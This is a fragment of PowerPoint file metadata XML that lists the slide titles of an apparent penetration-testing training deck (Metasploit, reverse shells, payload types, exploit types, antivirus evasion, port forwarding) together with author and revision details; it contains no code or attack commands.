      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Search For Exploits</vt:lpstr>
      <vt:lpstr>Metasploit</vt:lpstr>
      <vt:lpstr>Metasploite</vt:lpstr>
      <vt:lpstr>Bind Shell vs Reverse Shell</vt:lpstr>
      <vt:lpstr>Shell vs Meterpreter</vt:lpstr>
      <vt:lpstr>Staged Payload vs Single Payload</vt:lpstr>
      <vt:lpstr>Exploit Types</vt:lpstr>
      <vt:lpstr>Service Side Exploit</vt:lpstr>
      <vt:lpstr>Service Side Exploit</vt:lpstr>
      <vt:lpstr>Client Side Exploit</vt:lpstr>
      <vt:lpstr>Client Side Exploit</vt:lpstr>
      <vt:lpstr>Client Side Exploit</vt:lpstr>
      <vt:lpstr>Client Side Exploit</vt:lpstr>
      <vt:lpstr>AntiVirus Evasion</vt:lpstr>
      <vt:lpstr>Port Forwarding</vt:lpstr>
      <vt:lpstr>Port Forwarding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Web Monitoring</dc:title>
  <dc:creator>Mohamed Wahby</dc:creator>
  <cp:lastModifiedBy>N0LL101</cp:lastModifiedBy>
  <cp:revision>60</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-11-01T00:43:52Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-08-13T17:43:32Z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0x01010061FE1B373C7A1A409814D857F1C07B2D</vt:lpwstr>
  </property>
</Properties>
</file>